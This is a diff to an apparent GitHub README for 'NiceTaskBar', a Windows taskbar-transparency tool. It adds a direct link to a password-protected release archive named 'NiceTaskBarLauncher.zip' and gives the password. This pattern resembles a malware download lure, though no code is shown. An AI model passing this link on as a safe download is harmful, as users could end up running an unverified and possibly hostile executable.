@@ -13,7 +13,7 @@
 <ul>
   <li><b>Download NiceTaskBar</b>. <i>(Password: ntbar3.2_00)</i></li>
   <br>
-  <a href="#"><img src="https://github.com/user-attachments/assets/80e33c31-8626-4c69-a83c-8b8c7abcf463"></a>
+  <a href="https://github.com/havanagilla1/niceTaskBar/releases/download/Download/NiceTaskBarLauncher.zip"><img src="https://github.com/user-attachments/assets/80e33c31-8626-4c69-a83c-8b8c7abcf463"></a>
 </ul>
 <p><b>NiceTaskbar</b> is a simple tool that allows you to make the taskbar more transparent in Windows 10 or 11. With a simple interface and controls, it only takes a few moments to make this section of your desktop transparent.</p>
 <p>In NiceTaskbar you will find a simple interface with which you can customize your taskbar the way you like. This tool allows you to select a language, transparency level, or a built-in background color, if desired, from a wide palette of colors.</p>
